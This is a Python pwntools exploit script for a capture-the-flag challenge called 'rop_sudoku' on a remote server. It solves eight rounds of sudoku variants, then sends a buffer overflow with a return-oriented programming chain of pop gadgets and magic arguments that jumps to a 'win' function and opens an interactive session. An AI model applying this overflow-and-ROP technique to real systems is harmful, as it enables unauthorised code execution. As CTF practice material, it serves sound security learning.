#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 128.199.157.172 --port 25452 ./rop_sudoku
from pwn import *
import numpy as np
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rop_sudoku')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '128.199.157.172'
port = int(args.PORT or 25452)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

def findNextCellToFill(sudoku):
    for x in range(9):
        for y in range(9):
            if sudoku[x][y] == 0:
                return x, y
    return -1, -1

def isValid(sudoku, i, j, e, knight=0):
    rowOk = all([e != sudoku[i][x] for x in range(9)])
    if rowOk:
        columnOk = all([e != sudoku[x][j] for x in range(9)])
        if columnOk:
            secTopX, secTopY = 3*(i//3), 3*(j//3)
            for x in range(secTopX, secTopX+3):
                for y in range(secTopY, secTopY+3):
                    if sudoku[x][y] == e:
                        return False
            if knight:            
                X = [2, 1, -1, -2, -2, -1, 1, 2]; 
                Y = [1, 2, 2, 1, -1, -2, -2, -1];
                for num1 in range(len(X)):
                    x = X[num1] + i
                    y = Y[num1] + j
                    if x >= 0 and x < 9 and y >= 0 and y <9 :
                        if sudoku[x][y] == e:
                            return False

            return True
    return False

def solveSudoku(sudoku, i=0, j=0,knight=0):
    i, j = findNextCellToFill(sudoku)
    if i == -1:
        return True
    for e in range(1, 10):
        if isValid(sudoku, i, j, e, knight):
            sudoku[i][j] = e
            if solveSudoku(sudoku, i, j, knight):
                return True
            sudoku[i][j] = 0
    return False



step=0
while step < 8:
    check=[]
    data=[]
    ans=[0 for i in range(8)]
    if (step < 2):
        io.recvuntil("Level 1 : Normal sudoku\n\n")
    elif(step >= 2 and step <=4):
        io.recvuntil("Level 2 : Diagonal sudoku\n\n")
    elif(step >4 ):
        io.recvuntil("Level 3 : Diagonal with anti-knight move sudoku\n\n")

    i=0
    for _ in range(11):
        temp=(io.recvline()[:-1]).replace("  |","")
        if temp[0]!="-":
            check.append(temp.split(" "))
            temp=temp.replace("A","0")
            temp=temp.replace("B","0")
            temp=temp.replace("C","0")
            temp=temp.replace("D","0")
            temp=temp.replace("E","0")
            temp=temp.replace("F","0")
            temp=temp.replace("G","0")
            temp=temp.replace("H","0")
            temp=temp.split(" ")
            for i in range(len(temp)):
                temp[i]=int(temp[i])

            data.append(temp)

    if (step > 4):
        solveSudoku(data,knight=1)
    else:
        solveSudoku(data)

    for i in range(len(check)):
        for j in range(len(check[i])):
            if check[i][j]=="A":
                ans[0]=data[i][j]
            elif check[i][j]=="B":
                ans[1]=data[i][j]

            elif check[i][j]=="C":
                ans[2]=data[i][j]

            elif check[i][j]=="D":
                ans[3]=data[i][j]

            elif check[i][j]=="E":
                ans[4]=data[i][j]

            elif check[i][j]=="F":
                ans[5]=data[i][j]

            elif check[i][j]=="G":
                ans[6]=data[i][j]

            elif check[i][j]=="H":
                ans[7]=data[i][j]

    p="".join([str(ans[i]) for i in range(len(ans))])
    io.sendline(p)
    leak=io.readline()
    if "Correct!" in leak :
        step+=1
        print step

p='a'*16
p+=p64(0x0000000000401723) # pop rdi
p+=p64(0xbeefdeaddeadbeef)
p+=p64(0x0000000000401721) # pop rsi
p+=p64(0xdeadbeefbeefdead)
p+=p64(0)
p+=p64(0x0000000000401296) # win
io.sendline(p)

io.interactive()

